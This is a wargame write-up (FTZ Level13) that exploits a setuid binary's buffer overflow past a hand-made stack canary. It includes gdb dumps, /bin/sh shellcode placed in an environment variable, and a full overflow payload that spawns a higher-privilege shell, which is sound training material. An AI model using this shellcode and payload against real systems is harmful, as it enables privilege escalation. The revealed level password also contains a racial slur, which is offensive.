# Level13

## This level's goal
- Memory protection
- Stack Guard

***

```
[level13@ftz level13]$ ls -l
total 28
-rwsr-x---    1 level14  level13     13953 Mar  8  2003 attackme
-rw-r-----    1 root     level13       258 Mar  8  2003 hint

[level13@ftz level13]$ cat hint

#include <stdlib.h>

main(int argc, char *argv[])
{
   long i=0x1234567;
   char buf[1024];

   setreuid( 3094, 3094 );
   if(argc > 1)
   strcpy(buf,argv[1]);

   if(i != 0x1234567) {
   printf(" Warnning: Buffer Overflow !!! \n");
   kill(0,11);
   }
}
```

The hint seems like BOF. I will debug the attackme at the first to get information.

The attackme has only execute permission in this level, so I need to copy that first for debug.

```
[level13@ftz level13]$ cp attackme tmp/
[level13@ftz level13]$ gdb -q tmp/attackme
(gdb) disass main
0x080484a3 <main+3>:    sub    $0x418,%esp
0x080484e5 <main+69>:   cmpl   $0x1234567,0xfffffff4(%ebp)
0x080484ec <main+76>:   je     0x804850d <main+109>
0x0804850d <main+109>:  leave
0x0804850e <main+110>:  ret

(gdb) break *0x080484e5
Breakpoint 1 at 0x80484e5

(gdb) run AAAAAAAA
Starting program: /home/level13/tmp/attackme AAAAAAAA

(gdb) x/264x $esp
0xbfffe740:     0x41414141      0x41414141      0x00000000      0x00000000
0xbfffe750:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffe760:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffe770:     0x00000000      0x00000000      0x400126d0      0x400126c8
0xbfffe780:     0x400126ca      0x4001552c      0xd51e93e7      0x00001822
0xbfffe790:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffe7a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffe7b0:     0x00000000      0x00000000      0x00000000      0x40016558
0xbfffe7c0:     0x00000040      0x00000080      0x00000010      0x08048204
0xbfffe7d0:     0x08048164      0x00000000      0x40015a38      0x40015360
0xbfffe7e0:     0x00000000      0x00000000      0x0804968c      0x40015a38
0xbfffe7f0:     0x00000000      0x400169e0      0xd51b5967      0x00001822
0xbfffe800:     0x00000000      0x01000000      0x00000000      0x00000000
0xbfffe810:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffe820:     0x00000001      0x00000000      0x00000000      0x00000000
0xbfffe830:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffe840:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffe850:     0x00000006      0x400169e0      0x000fffff      0x00000051
0xbfffe860:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffe870:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffe880:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffe890:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffe8a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffe8b0:     0x00000000      0x00000000      0x00000000      0x4000fbce
0xbfffe8c0:     0x00000000      0x00000000      0x40001001      0x4001582c
0xbfffe8d0:     0x40015a34      0x00020414      0xbfffeb08      0x4000eeaf
0xbfffe8e0:     0x08048034      0x00000006      0xbfffe91c      0x00000000
0xbfffe8f0:     0x00000000      0x00000000      0x00000000      0x2d000000
0xbfffe900:     0x00000003      0xbfffe9a2      0x0003fbf9      0x00000000
0xbfffe910:     0x00000000      0x00000006      0x08048034      0x080483a0
0xbfffe920:     0x756e694c      0x00000078      0x00000000      0x00000000
0xbfffe930:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffe940:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffe950:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffe960:     0x7a746600      0x6361682e      0x7372656b      0x6f6f6863
0xbfffe970:     0x726f2e6c      0x00000067      0x00000000      0x00000000
0xbfffe980:     0x4000914d      0x40009401      0x08048205      0x40015c68
0xbfffe990:     0x400093bb      0x4001582c      0x40015a38      0x00000000
0xbfffe9a0:     0xbfffe9e0      0x4000914d      0x42010c7f      0x08048289
0xbfffe9b0:     0x4001582c      0x4001624c      0x00000020      0x42010d36
0xbfffe9c0:     0x4200bc84      0x42003394      0x400160b0      0x00000003
0xbfffe9d0:     0x40016350      0x4001582c      0x40015bd4      0x08048264
0xbfffe9e0:     0xbfffeac0      0x40008156      0x08048264      0x078e530f
0xbfffe9f0:     0x08048174      0xbfffea70      0x40015b88      0x00000001
0xbfffea00:     0x40016380      0x00000000      0x00000001      0x42010d36
0xbfffea10:     0x4200bc84      0x42003394      0x400160b0      0x00000003
0xbfffea20:     0x40016350      0x4001582c      0x40015bd4      0x08048252
0xbfffea30:     0xbfffeb10      0x40008156      0x08048252      0x0177ff8e
0xbfffea40:     0x08048194      0xbfffeac0      0xbfffea70      0x00000001
0xbfffea50:     0x40016380      0x00000000      0x00000000      0x078e530f
0xbfffea60:     0xbfffeb00      0x40015a38      0x0029656e      0x00000000
0xbfffea70:     0x4200b894      0x400160b0      0x00000000      0x00000000
0xbfffea80:     0x00000000      0x00000000      0x00000000      0x4000807f
0xbfffea90:     0x4001582c      0x00001f1f      0xbfffeac0      0xbfffeaec
0xbfffeaa0:     0x4000be03      0x4001624c      0x00000000      0x0177ff8e
0xbfffeab0:     0x4000807f      0x4001582c      0x00000060      0x40015a38
0xbfffeac0:     0xbfffeb10      0x4000be03      0x40015bd4      0x40016380
0xbfffead0:     0x00000001      0x00000000      0x4200dba3      0x420069e4
0xbfffeae0:     0x42130a14      0xbffffc21      0xbfffeba4      0xbfffeb24
0xbfffeaf0:     0x4000bcc0      0x080496d8      0x00000001      0x08048264
0xbfffeb00:     0x4210fd3c      0x42130a14      0xbfffeb28      0x4210fdf6
0xbfffeb10:     0x080495f0      0x080496f8      0x00000000      0x00000000
0xbfffeb20:     0x4210fdc0      0x42130a14      0xbfffeb48      0x08048481
0xbfffeb30:     0x080495f0      0x080496f8      0x4001582c      0x080483ce
0xbfffeb40:     0x08048308      0x42130a14      0xbfffeb58      0x01234567
0xbfffeb50:     0x4200af84      0x42130a14      0xbfffeb78      0x42015574

(gdb) continue
Continuing.

(gdb) run $(perl -e 'print "A"x1048')
Starting program: /home/level13/tmp/attackme $(perl -e 'print "A"x1048')

(gdb) x/264x $esp
0xbfffe1b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe1c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe1d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe1e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe1f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe200:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe210:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe220:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe230:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe240:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe250:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe260:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe270:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe280:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe290:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe2a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe2b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe2c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe2d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe2e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe2f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe300:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe310:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe320:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe330:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe340:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe350:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe360:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe370:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe380:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe390:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe3a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe3b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe3c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe3d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe3e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe3f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe400:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe410:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe420:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe430:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe440:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe450:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe460:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe470:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe480:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe490:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe4a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe4b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe4c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe4d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe4e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe4f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe500:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe510:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe520:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe530:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe540:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe550:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe560:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe570:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe580:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe590:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe5a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe5b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe5c0:     0x41414141      0x41414141      0xbfffe500      0x42015574

(gdb) continue
Continuing.
 Warnning: Buffer Overflow !!!

Program received signal SIGSEGV, Segmentation fault.
0xffffe002 in ?? ()
```
0x418 = 1048 bytes, which is char buf[1024] in the hint.

So, the memory is 1024bytes + dummy(12bytes) + stack gruad(4bytes) + dummay(8bytes) + SFP(4bytes) + RET(4bytes).

In first run debug, I input AAAAAAAA(4141414141414141, 8bytes) and could see the 0x01234567(canary) before SFP(4bytes) RET(4bytes).

In second run debug, I input Ax1048 (which can be overflow) and colud see that there is no canary and the result of buffer overflow.

As a result of the debug, the attackme in this level has a stack guard and I will exploit with by-pass stack guard.

```
[level13@ftz tmp]$ export EGG=`python -c 'print "\x90"*15+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

[level13@ftz tmp]$ cat getegg
#include <stdlib.h>

main() {
        printf("EGG : %p", getenv("EGG"));
}
[level13@ftz tmp]$ gcc getegg.c -o getegg
[level13@ftz tmp]$ ./getegg
EGG : 0xbffffc8e
```

I made the env variable of EGG(shell code) and then made getegg(to get EGG's address).

And I will exploit 1036bytes dummy string + stackguard(\x67\x45\x23\x01) + 12bytes dummy string + the egg's adress(0xbffffc8e)

``` 
[level13@ftz level13]$ ./attackme `python -c 'print "A"*1036+"\x67\x45\x23\x01"+"A"*12+"\x8e\xfc\xff\xbf"'`

sh-2.05b$ id
uid=3094(level14) gid=3093(level13) groups=3093(level13)

sh-2.05b$ my-pass
TERM environment variable not set.

Level14 Password is "what that nigga want?".
```
